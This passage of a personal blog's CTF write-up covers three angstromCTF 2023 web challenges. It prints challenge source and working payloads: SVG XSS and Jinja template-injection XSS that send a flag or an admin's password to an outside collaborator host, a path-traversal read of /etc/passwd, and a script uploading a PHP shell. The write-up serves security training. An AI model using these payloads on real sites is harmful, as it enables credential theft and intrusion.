<span class="w">    </span><span class="nx">cards</span><span class="p">[</span><span class="nx">id</span><span class="p">].</span><span class="nx">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">"image/svg+xml"</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">IMAGES</span><span class="p">[</span><span class="nx">svg</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s2">"heart"</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">content</span><span class="p">;</span>

<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"ok"</span><span class="p">);</span>
<span class="p">});</span>


<span class="c1">// the admin bot will be able to access this</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/flag"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">secret</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="nx">secret</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"you can't view this &gt;:("</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">"index.html"</span><span class="p">));</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server listening on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">.`</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div>
<p>There were three actions for the <code>card</code> endpoint:</p>
<ul>
<li>GET: required the get parameter <code>id</code> and would display the card if the <code>id</code> existed.</li>
<li>POST: generated a card, the action used by the site when generating a card</li>
<li>PUT: this method was never used on the site directly but could be used manually to edit a card</li>
</ul>
<p>We generated an SVG card using the application user interface (this used the <code>/card</code> POST method).</p>
<div class="highlight"><pre><span></span><code>POST /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

svg=heart&amp;content=aaa
</code></pre></div>
<p>The response contained our card ID.</p>
<div class="highlight"><pre><span></span><code>HTTP/1.1 302 Found
Server: nginx/1.23.3
Date: Thu, 26 Apr 2023 19:29:04 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 67
Connection: keep-alive
X-Powered-By: Express
Location: /card?id=eb184d2d-6ae9-416d-adb4-6f89afca7e74
Vary: Accept

Found. Redirecting to /card?id=eb184d2d-6ae9-416d-adb4-6f89afca7e74
</code></pre></div>
<p>We modified the card using the PUT method. In order to keep the <code>Content-Type</code> as <code>image/svg+xml</code> we
needed to take advantage of the loose comparison <code>cards[id].type = type == "image/svg+xml" ? type : "text/plain";</code>
using <code>type[]=image/svg%2bxml</code>. We also included an SVG file containing a XSS payload (a simple
<code>alert('XSS')</code> for now).</p>
<div class="highlight"><pre><span></span><code>PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 1601

svg=heart&amp;type[]=image/svg%2bxml&amp;content=&lt;svg+xmlns%3d"http%3a//www.w3.org/2000/svg"+width%3d"400"+height%3d"400"+viewBox%3d"0+0+400+400"+onload%3d"alert('XSS')"&gt;&lt;path+fill%3d"%23465283"+d%3d"M32.805+143.09h58.993c17.316.145+29.863+5.11+37.64+14.894+7.778+9.784+10.346+23.146+7.705+40.085-1.027+7.74-3.301+15.333-6.824+22.78-3.375+7.448-8.071+14.165-14.087+20.153-7.338+7.593-15.189+12.412-23.554+14.456-8.364+2.045-17.022+3.067-25.974+3.067H40.29l-8.365+41.618H1.328l31.477-157.054m25.755+24.97l-13.207+65.714c.88.146+1.76.219+2.641.219h3.082c14.087.146+25.827-1.241+35.22-4.162+9.39-3.066+15.7-13.726+18.93-31.98+2.64-15.333-.001-24.168-7.926-26.504-7.777-2.337-17.536-3.431-29.275-3.286a61.27+61.27+0+0+1-5.063.219H58.34l.22-.22m113.445-66.795h30.377l-8.585+41.838h27.295c14.969.291+26.121+3.358+33.459+9.2+7.484+5.84+9.686+16.939+6.603+33.294l-14.748+72.941h-30.817l14.088-69.655c1.467-7.302+1.027-12.486-1.32-15.553-2.349-3.066-7.412-4.599-15.189-4.599l-24.434-.22-18.049+90.027h-30.377l31.697-157.272m121.773+41.824h58.992c17.317.146+29.864+5.112+37.641+14.895+7.777+9.784+10.346+23.146+7.704+40.085-1.027+7.74-3.301+15.333-6.823+22.78-3.376+7.448-8.072+14.165-14.088+20.153-7.338+7.593-15.188+12.412-23.554+14.456-8.363+2.045-17.022+3.067-25.973+3.067h-26.415l-8.364+41.617H262.3l31.478-157.053m25.754+24.97l-13.208+65.714a16.17+16.17+0+0+0+2.643.219h3.08c14.09.146+25.829-1.241+35.22-4.162+9.392-3.066+15.703-13.726+18.931-31.98+2.641-15.333+0-24.168-7.924-26.504-7.778-2.337-17.537-3.431-29.277-3.286a61.31+61.31+0+0+1-5.061.219h-4.624l.22-.22"/&gt;&lt;/svg&gt;&amp;id=498b8244-43c1-4ae1-a520-89b33fd164fe
</code></pre></div>
<p>The XSS was triggered when browsing the card:
<img alt="XSS triggered" src="/media/2023.05/hallmark.png"/></p>
<p>We craft a payload that will request the flag and send it to a Burp collaborator:
<code>fetch('/flag').then(flag=&gt;flag.text()).then(flag =&gt; fetch('https://burp.collaborator/'+flag))</code></p>
<p>We modify the SVG file:</p>
<div class="highlight"><pre><span></span><code>PUT /card HTTP/1.1
Host: hallmark.web.actf.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 1713

svg=heart&amp;type[]=image/svg%2bxml&amp;content=&lt;svg+xmlns%3d"http%3a//www.w3.org/2000/svg"+width%3d"400"+height%3d"400"+viewBox%3d"0+0+400+400"+onload%3d"fetch('/flag').then(flag=&gt;flag.text()).then(flag+%3d&gt;+fetch('https://f8oln394j5jyuy7praekidg2vt1kpbd0.oastify.com/'%2bflag))"&gt;&lt;path+fill%3d"%23465283"+d%3d"M32.805+143.09h58.993c17.316.145+29.863+5.11+37.64+14.894+7.778+9.784+10.346+23.146+7.705+40.085-1.027+7.74-3.301+15.333-6.824+22.78-3.375+7.448-8.071+14.165-14.087+20.153-7.338+7.593-15.189+12.412-23.554+14.456-8.364+2.045-17.022+3.067-25.974+3.067H40.29l-8.365+41.618H1.328l31.477-157.054m25.755+24.97l-13.207+65.714c.88.146+1.76.219+2.641.219h3.082c14.087.146+25.827-1.241+35.22-4.162+9.39-3.066+15.7-13.726+18.93-31.98+2.64-15.333-.001-24.168-7.926-26.504-7.777-2.337-17.536-3.431-29.275-3.286a61.27+61.27+0+0+1-5.063.219H58.34l.22-.22m113.445-66.795h30.377l-8.585+41.838h27.295c14.969.291+26.121+3.358+33.459+9.2+7.484+5.84+9.686+16.939+6.603+33.294l-14.748+72.941h-30.817l14.088-69.655c1.467-7.302+1.027-12.486-1.32-15.553-2.349-3.066-7.412-4.599-15.189-4.599l-24.434-.22-18.049+90.027h-30.377l31.697-157.272m121.773+41.824h58.992c17.317.146+29.864+5.112+37.641+14.895+7.777+9.784+10.346+23.146+7.704+40.085-1.027+7.74-3.301+15.333-6.823+22.78-3.376+7.448-8.072+14.165-14.088+20.153-7.338+7.593-15.188+12.412-23.554+14.456-8.363+2.045-17.022+3.067-25.973+3.067h-26.415l-8.364+41.617H262.3l31.478-157.053m25.754+24.97l-13.208+65.714a16.17+16.17+0+0+0+2.643.219h3.08c14.09.146+25.829-1.241+35.22-4.162+9.392-3.066+15.703-13.726+18.931-31.98+2.641-15.333+0-24.168-7.924-26.504-7.778-2.337-17.537-3.431-29.277-3.286a61.31+61.31+0+0+1-5.061.219h-4.624l.22-.22"/&gt;&lt;/svg&gt;&amp;id=498b8244-43c1-4ae1-a520-89b33fd164fe
</code></pre></div>
<p>We verified that our payload was working and got an interaction
<code>/you%20can't%20view%20this%20%3E:(?p0wu1=1</code> on our collaborator instance.</p>
<p>Then, we sent our card to the admin and got the flag as a collaborator interaction:</p>
<p>`GET /actf%7Bthe_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33%7D HTTP/1.1</p>
<h1>brokenlogin</h1>
<ul>
<li>110 points</li>
<li>167 solves</li>
</ul>
<p>The application was an authentication form with an impossible login. As the previous challenge an
administrator is simulated with a web page. Below is the JavaScript for the admin bot:</p>
<div class="highlight"><pre><span></span><code><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="s2">"brokenlogin"</span><span class="p">,</span>
<span class="w">    </span><span class="nx">timeout</span><span class="o">:</span><span class="w"> </span><span class="mf">7000</span><span class="p">,</span>
<span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">execute</span><span class="p">(</span><span class="nx">browser</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/^https:\/\/brokenlogin\.web\.actf\.co\/.*/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">url</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNetworkIdle</span><span class="p">({</span>
<span class="w">            </span><span class="nx">timeout</span><span class="o">:</span><span class="w"> </span><span class="mf">5000</span><span class="p">,</span>
<span class="w">        </span><span class="p">});</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s2">"input[name=username]"</span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">$eval</span><span class="p">(</span>
<span class="w">          </span><span class="s2">"input[name=username]"</span><span class="p">,</span>
<span class="w">          </span><span class="p">(</span><span class="nx">el</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="nx">el</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">)</span>
<span class="w">        </span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s2">"input[name=password]"</span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">$eval</span><span class="p">(</span>
<span class="w">          </span><span class="s2">"input[name=password]"</span><span class="p">,</span>
<span class="w">          </span><span class="p">(</span><span class="nx">el</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">(</span><span class="nx">el</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">password</span><span class="p">),</span>
<span class="w">          </span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">CHALL_BROKENLOGIN_FLAG</span>
<span class="w">        </span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s2">"input[type=submit]"</span><span class="p">);</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">((</span><span class="nx">r</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span><span class="w"> </span><span class="mf">1000</span><span class="p">));</span>

<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="w">    </span><span class="p">},</span>
<span class="p">};</span>
</code></pre></div>
<p>Looking at the source code we
noticed that a Flask Jinja template is used to build the page. In addition, it is possible to add a
custom failure message using a GET parameter message.</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">escape</span><span class="p">,</span> <span class="n">render_template_string</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">fails</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">indexPage</span> <span class="o">=</span> <span class="s2">"""</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">    &lt;head&gt;</span>
<span class="s2">        &lt;title&gt;Broken Login&lt;/title&gt;</span>
<span class="s2">    &lt;/head&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;p style="color: red; fontSize: '28px';"&gt;</span><span class="si">%s</span><span class="s2">&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;Number of failed logins: {{ fails }}&lt;/p&gt;</span>
<span class="s2">        &lt;form action="/" method="POST"&gt;</span>
<span class="s2">            &lt;label for="username"&gt;Username: &lt;/label&gt;</span>
<span class="s2">            &lt;input id="username" type="text" name="username" /&gt;&lt;br /&gt;&lt;br /&gt;</span>

<span class="s2">            &lt;label for="password"&gt;Password: &lt;/label&gt;</span>
<span class="s2">            &lt;input id="password" type="password" name="password" /&gt;&lt;br /&gt;&lt;br /&gt;</span>

<span class="s2">            &lt;input type="submit" /&gt;</span>
<span class="s2">        &lt;/form&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">"""</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">fails</span>
    <span class="n">custom_message</span> <span class="o">=</span> <span class="s2">""</span>

    <span class="k">if</span> <span class="s2">"message"</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">"message"</span><span class="p">])</span> <span class="o">&gt;=</span> <span class="mi">25</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">indexPage</span><span class="p">,</span> <span class="n">fails</span><span class="o">=</span><span class="n">fails</span><span class="p">)</span>

        <span class="n">custom_message</span> <span class="o">=</span> <span class="n">escape</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="s2">"message"</span><span class="p">])</span>

    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">indexPage</span> <span class="o">%</span> <span class="n">custom_message</span><span class="p">,</span> <span class="n">fails</span><span class="o">=</span><span class="n">fails</span><span class="p">)</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">fails</span>
    <span class="n">fails</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">make_response</span><span class="p">(</span><span class="s2">"wrong username or password"</span><span class="p">,</span> <span class="mi">401</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">"0.0.0.0"</span><span class="p">)</span>
</code></pre></div>
<p>For instance <code>https://brokenlogin.web.actf.co/?message=aa</code> would display <code>aa</code> at the beginning of the
page (in red). This parameter is interpreted as a Jinja2 input and <code>7*7</code> would result in <code>49</code>. We
could also use <code>https://brokenlogin.web.actf.co/?message={{%20config.items()%20}}</code> to retrieve the
configuration.</p>
<div class="highlight"><pre><span></span><code>dict_items([('ENV', 2), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', None), ('JSON_SORT_KEYS', None), ('JSONIFY_PRETTYPRINT_REGULAR', None), ('JSONIFY_MIMETYPE', None), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('g', Undefined), ('a', 2), ('x', 13), ('aa', 1), ('add', 1), ('z', 2), (6, 9), ('q', 2)])
</code></pre></div>
<p>We were limited by a length check and our custom message could not be more than 25 characters. But
using <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.safe">Jinja2 filters</a> in
addition to requests parameters we were able to craft an XSS:</p>
<p><code>https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&amp;a=%3Cscript%3Ealert(1);%3C/script%3E</code></p>
<p><img alt="XSS triggered" src="/media/2023.05/hallmark.png"/></p>
<p>We needed to retrieve and exhilarate the flag. But we also needed to wait for the form to be fully
loaded. Using <code>window.onload</code> would achieve that. After a few try the final payload looked like
this:</p>
<p><code>https://brokenlogin.web.actf.co/?message={{request.args.a|safe}}&amp;a=%3Cscript%3Ewindow.onload%20=function(){document.forms[0].action=%22https://zux59nvo5p5igit9du044x2mhdn4bxzm.oastify.com%22};%3C/script%3E</code></p>
<p>Sending this link to the admin resulted in an interaction with our collaborator that disclosed the
flag.</p>
<div class="highlight"><pre><span></span><code>POST / HTTP/1.1
Host: zux59nvo5p5igit9du044x2mhdn4bxzm.oastify.com
&lt;SNIP&gt;

username=admin&amp;password=actf%7Badm1n_st1ll_c4nt_l0g1n_11dbb6af58965de9%7D
</code></pre></div>
<h1>filestore</h1>
<ul>
<li>180 points</li>
<li>73 solves</li>
</ul>
<p>This was a PHP file store service.</p>
<div class="highlight"><pre><span></span><code>dist/
├── Dockerfile
├── list_uploads
├── make_abyss_entry
└── src
    ├── index.php
    └── uploads
        └── placeholder.txt
</code></pre></div>
<p>The main file was the PHP index:</p>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f"</span><span class="p">][</span><span class="s2">"size"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">1000</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"file too large"</span><span class="p">;</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="nv">$i</span> <span class="o">=</span> <span class="nb">uniqid</span><span class="p">();</span>

        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f"</span><span class="p">])){</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">],</span> <span class="s2">"./uploads/"</span> <span class="o">.</span> <span class="nv">$i</span> <span class="o">.</span> <span class="s2">"_"</span> <span class="o">.</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"_"</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"f"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">])){</span>
            <span class="k">echo</span> <span class="s2">"upload success"</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"upload error"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"f"</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">include</span> <span class="s2">"./uploads/"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"f"</span><span class="p">];</span>
        <span class="p">}</span>

        <span class="nb">highlight_file</span><span class="p">(</span><span class="s2">"index.php"</span><span class="p">);</span>

        <span class="c1">// this doesn't work, so I'm commenting it out 😛</span>
        <span class="c1">// system("/list_uploads");</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<p>Note that we had an LFI and <code>https://filestore.web.actf.co/?f=../../../../../etc/passwd</code> would
return the content of <code>/etc/passwd</code>.</p>
<p>Uploading a file would result in it being renamed using the <code>uniqid</code> function. As notice in a <a href="https://www.php.net/manual/en/function.uniqid.php">big
red box on the documentation</a> this function just
return the time in microseconds and must not be used for cryptographic purposes.</p>
<p>The final filename would be in the form <code>time_sha256sum_filename</code>.</p>
<p>We created a script that will upload a simple PHP shell and print the value of <code>uniqid</code> before and
after the request.</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">files</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'f'</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'shell.php'</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)}</span>

<span class="n">url</span> <span class="o">=</span> <span class="s1">'https://filestore.web.actf.co/'</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">'php -r </span><span class="se">\'</span><span class="s1">printf("uniqid(): </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">", uniqid());</span><span class="se">\'</span><span class="s1">'</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span><span class="c1">#, data=values)</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">'php -r </span><span class="se">\'</span><span class="s1">printf("uniqid(): </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">", uniqid());</span><span class="se">\'</span><span class="s1">'</span><span class="p">)</span>
</code></pre></div>
<p>It turned out that this was around 470k requests. It seemed too much to be bruteforce and there
should be another way.</p>
<p><em>I did not solve this challenge</em></p>
<p><a href="https://github.com/meme-lord/writeups/blob/main/angstrom/2023/filestore.md">Meme-Lord, used ffuf to bruteforce it and you can find the followup of the challenge in his writeup</a></p>
<p><a href="https://github.com/TCP1P/TCP1P_CTF_writeup/tree/main/2023/angstromctf-2023#filestore---web">Another method was to use <code>pearcmd.php</code></a>.
This method is also detailed <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">here (gist)</a>
and <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters">here (hacktricks)</a>.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/ctf.html">ctf</a>
<a href="../../tag/web.html">web</a>
<a href="../../tag/ssti.html">SSTI</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2022/10/cross-site-scripting-in-lychee.html" title="Cross-Site Scripting in Lychee">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2023/05/challenge-sstic-2023-stage-0-1.html" title="Challenge SSTIC 2023 - stage 0 &amp; 1">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2024  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p></footer> </main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>